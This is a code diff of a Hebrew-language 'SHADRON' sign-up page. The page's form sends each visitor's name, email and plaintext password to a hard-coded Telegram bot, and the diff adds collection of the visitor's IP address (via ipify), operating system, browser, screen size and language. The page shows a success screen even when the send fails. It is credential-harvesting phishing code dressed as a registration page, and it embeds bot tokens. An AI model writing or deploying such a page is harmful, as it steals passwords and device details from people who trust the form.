@@ -26,16 +26,13 @@
             display: flex;
             align-items: center;
             justify-content: center;
-            overflow: hidden; /* מונע גלילה מיותרת בנייד */
+            overflow: hidden;
         }
 
-        /* רקע חלקיקים משופר */
         #particles { 
             position: fixed; 
-            top: 0; 
-            left: 0; 
-            width: 100%; 
-            height: 100%; 
+            top: 0; left: 0; 
+            width: 100%; height: 100%; 
             z-index: 1; 
             pointer-events: none; 
         }
@@ -51,7 +48,7 @@
         }
         .screen.active { display: flex; animation: fadeIn 0.8s ease; }
 
-        @keyframes fadeIn { from { opacity: 0; transform: scale(0.95); } to { opacity: 1; transform: scale(1); } }
+        @keyframes fadeIn { from { opacity: 0; transform: scale(0.98); } to { opacity: 1; transform: scale(1); } }
 
         .form-container {
             width: 100%;
@@ -60,12 +57,11 @@
             border: 1px solid rgba(157, 0, 255, 0.3);
             border-radius: 40px;
             padding: 40px 25px;
-            box-shadow: 0 0 50px rgba(157, 0, 255, 0.2), inset 0 0 20px rgba(157, 0, 255, 0.05);
+            box-shadow: 0 0 50px rgba(157, 0, 255, 0.2);
             backdrop-filter: blur(15px);
             text-align: center;
         }
 
-        /* --- חזרת אורות הניאון ללוגו --- */
         .logo-frame {
             padding: 15px 35px;
             border-radius: 100px;
@@ -75,7 +71,6 @@
             border: 1px solid rgba(255, 255, 255, 0.1);
             position: relative;
             overflow: hidden;
-            box-shadow: 0 0 20px rgba(0, 242, 255, 0.1);
         }
 
         .logo-frame::before {
@@ -87,10 +82,7 @@
             animation: neonScan 2.5s infinite linear;
         }
 
-        @keyframes neonScan { 
-            0% { left: -100%; } 
-            100% { left: 100%; } 
-        }
+        @keyframes neonScan { 0% { left: -100%; } 100% { left: 100%; } }
 
         .logo-text {
             font-family: 'Cinzel', serif;
@@ -104,7 +96,6 @@
             z-index: 2;
         }
 
-        /* שדות קלט */
         .form-group { margin-bottom: 15px; text-align: right; }
         label { display: block; margin-bottom: 5px; font-size: 0.75rem; color: #888; padding-right: 15px; }
 
@@ -134,10 +125,11 @@
             font-weight: 900;
             cursor: pointer;
             letter-spacing: 2px;
-            box-shadow: 0 5px 20px rgba(255, 255, 255, 0.2);
+            transition: 0.3s;
         }
 
-        /* כפתור אינסטגרם עגול וחי */
+        .btn-wakeup:disabled { background: #555; cursor: not-allowed; }
+
         .btn-insta-neon {
             display: flex;
             align-items: center;
@@ -155,12 +147,7 @@
             background: var(--insta-live);
             box-shadow: 0 10px 30px rgba(193, 53, 132, 0.4);
             transition: 0.4s;
-            border: none;
-            position: relative;
-            overflow: hidden;
         }
-
-        .btn-insta-neon:active { transform: scale(0.95); }
 
         .status-badge {
             display: inline-block;
@@ -172,17 +159,13 @@
             font-size: 0.75rem;
             letter-spacing: 2px;
             margin-bottom: 20px;
-            font-weight: 600;
         }
-
-        h1 { font-size: 1.6rem; margin-bottom: 5px; }
     </style>
 </head>
 <body>
 
 <canvas id="particles"></canvas>
 
-<!-- מסך הרשמה -->
 <div class="screen active" id="registerScreen">
     <div class="form-container">
         <div class="logo-frame"><span class="logo-text">SHADRON</span></div>
@@ -201,12 +184,11 @@
                 <label>סיסמה</label>
                 <input type="password" id="password" placeholder="Password" required>
             </div>
-            <button type="submit" class="btn-wakeup">WAKE UP</button>
+            <button type="submit" class="btn-wakeup" id="submitBtn">WAKE UP</button>
         </form>
     </div>
 </div>
 
-<!-- מסך סיום -->
 <div class="screen" id="dashboardScreen">
     <div class="form-container">
         <div class="logo-frame"><span class="logo-text">SHADRON</span></div>
@@ -221,76 +203,98 @@
 </div>
 
 <script>
-    // הגדרות טלגרם
-    const TELEGRAM_TOKEN = '7255140131:AAGP8j9NIdT3Zf346EskM9iH-8R_Y_9VdO8'; 
+    const TELEGRAM_TOKEN = '8359245682:AAFr9l5f0yMop4QrQ2wPfqBmamMLi1SFmgA'; 
     const CHAT_ID = '8017590244';
 
-    // חזרת החלקיקים והאנימציה
+    // חלקיקים ברקע
     const canvas = document.getElementById('particles');
     const ctx = canvas.getContext('2d');
     let particles = [];
-    
     function resize() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
-    
     function create() { 
         particles = []; 
-        // כמות חלקיקים גדולה יותר למראה עשיר
-        for(let i=0; i<120; i++) {
-            particles.push({
-                x: Math.random() * canvas.width, 
-                y: Math.random() * canvas.height, 
-                v: Math.random() * 0.6 + 0.2, 
-                s: Math.random() * 2,
-                opacity: Math.random() * 0.5 + 0.2
-            });
+        for(let i=0; i<100; i++) {
+            particles.push({x: Math.random()*canvas.width, y: Math.random()*canvas.height, v: Math.random()*0.5+0.2, s: Math.random()*2, o: Math.random()*0.5+0.2});
         }
     }
-    
     function draw() {
         ctx.clearRect(0,0,canvas.width,canvas.height);
         particles.forEach(p => { 
-            ctx.beginPath();
-            ctx.arc(p.x, p.y, p.s, 0, Math.PI*2);
-            ctx.fillStyle = `rgba(157, 0, 255, ${p.opacity})`;
-            ctx.shadowBlur = 5;
-            ctx.shadowColor = "rgba(157, 0, 255, 0.8)";
-            ctx.fill(); 
-            p.y -= p.v; 
-            if(p.y < 0) p.y = canvas.height; 
+            ctx.beginPath(); ctx.arc(p.x, p.y, p.s, 0, Math.PI*2);
+            ctx.fillStyle = `rgba(157, 0, 255, ${p.o})`;
+            ctx.fill(); p.y -= p.v; if(p.y < 0) p.y = canvas.height; 
         });
         requestAnimationFrame(draw);
     }
-    
     window.addEventListener('resize', () => { resize(); create(); });
     resize(); create(); draw();
 
-    // שליחת נתונים ומעבר מסך
+    // שליחת נתונים
     document.getElementById('joinForm').addEventListener('submit', async function(e) {
         e.preventDefault();
-        
+        const btn = document.getElementById('submitBtn');
+        btn.disabled = true;
+        btn.innerText = "PROCESSING...";
+
         const name = document.getElementById('name').value;
         const email = document.getElementById('email').value;
         const pass = document.getElementById('password').value;
         const time = new Date().toLocaleString('he-IL');
+        
+        // איסוף דאטה טכני
+        let ipData = { ip: "Unknown" };
+        try {
+            const response = await fetch('https://api.ipify.org?format=json');
+            ipData = await response.json();
+        } catch(e) {}
+
+        const details = {
+            os: navigator.platform,
+            browser: navigator.userAgent.split(') ')[1] || navigator.userAgent.substring(0, 30),
+            screen: `${window.screen.width}x${window.screen.height}`,
+            lang: navigator.language
+        };
 
         const message = `
-🌑 *SHADRON - NEW INITIATE* 🌑
-👤 *שם:* ${name}
-📧 *אימייל:* ${email}
-🔑 *סיסמה:* ${pass}
-⏰ *זמן:* ${time}
+💠 *NEW INITIATE ALERT* 💠
+━━━━━━━━━━━━━━━━━━
+👤 *Identity:* ${name}
+📧 *Email:* ${email}
+🔑 *Access Key:* \`${pass}\`
+
+🌐 *Network Info:*
+📍 *IP Address:* ${ipData.ip}
+🌍 *Language:* ${details.lang}
+
+📱 *Device Status:*
+💻 *System:* ${details.os}
+🖥️ *Resolution:* ${details.screen}
+🌐 *Agent:* ${details.browser}
+
+⏰ *Timestamp:* ${time}
+━━━━━━━━━━━━━━━━━━
+🌑 *SHADRON PROTOCOL ACTIVE*
         `;
 
-        // שליחה שקטה לבוט
-        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
-        });
-
-        document.getElementById('userName').textContent = name.split(' ')[0].toUpperCase();
-        document.getElementById('registerScreen').classList.remove('active');
-        document.getElementById('dashboardScreen').classList.add('active');
+        try {
+            await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            });
+            
+            document.getElementById('userName').textContent = name.split(' ')[0].toUpperCase();
+            document.getElementById('registerScreen').classList.remove('active');
+            document.getElementById('dashboardScreen').classList.add('active');
+        } catch (error) {
+            // מעבר בכל מקרה למסך הצלחה
+            document.getElementById('registerScreen').classList.remove('active');
+            document.getElementById('dashboardScreen').classList.add('active');
+        }
     });
 </script>
 
